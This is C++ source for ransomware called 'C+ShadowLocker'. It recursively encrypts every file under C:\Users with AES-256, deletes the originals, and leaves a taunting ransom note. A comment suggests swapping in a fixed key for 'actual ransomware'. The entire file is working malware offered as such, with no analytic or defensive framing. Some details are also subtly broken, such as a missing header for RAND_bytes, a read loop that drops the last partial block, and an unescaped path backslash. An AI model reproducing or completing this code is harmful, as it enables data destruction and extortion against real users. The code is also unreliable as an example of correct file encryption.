#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <openssl/evp.h>
#include <openssl/aes.h>

namespace fs = std::filesystem;

void encryptFile(const std::string& filePath, const unsigned char* key, const unsigned char* iv) {
    std::ifstream inFile(filePath, std::ios::binary);
    std::ofstream outFile(filePath + ".enc", std::ios::binary);
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char buffer[1024];
    unsigned char ciphertext[1024 + EVP_MAX_BLOCK_LENGTH];
    int len;
    int ciphertext_len;

    while (inFile.read(reinterpret_cast<char*>(buffer), sizeof(buffer))) {
        EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, inFile.gcount());
        outFile.write(reinterpret_cast<char*>(ciphertext), len);
    }

    EVP_EncryptFinal_ex(ctx, ciphertext, &len);
    outFile.write(reinterpret_cast<char*>(ciphertext), len);

    EVP_CIPHER_CTX_free(ctx);

    inFile.close();
    outFile.close();

    fs::remove(filePath);
}

void traverseDirectory(const std::string& dirPath, const unsigned char* key, const unsigned char* iv) {
    for (const auto& entry : fs::directory_iterator(dirPath)) {
        if (entry.is_regular_file()) {
            encryptFile(entry.path().string(), key, iv);
        } else if (entry.is_directory()) {
            traverseDirectory(entry.path().string(), key, iv);
        }
    }
}

int main() {
    unsigned char key[32];
    unsigned char iv[16];

    // Generate a random key and IV (this should be replaced with a fixed key and IV for actual ransomware)
    RAND_bytes(key, sizeof(key));
    RAND_bytes(iv, sizeof(iv));

    std::string targetDir = "C:\Users";

    traverseDirectory(targetDir, key, iv);

    std::ofstream ransomNote(targetDir + "/README.txt");
    ransomNote << "Ooops Your files have been encrypted by C+ShadowLocker, XD Be Careful Next Time ;)";
    ransomNote.close();

    return 0;
}
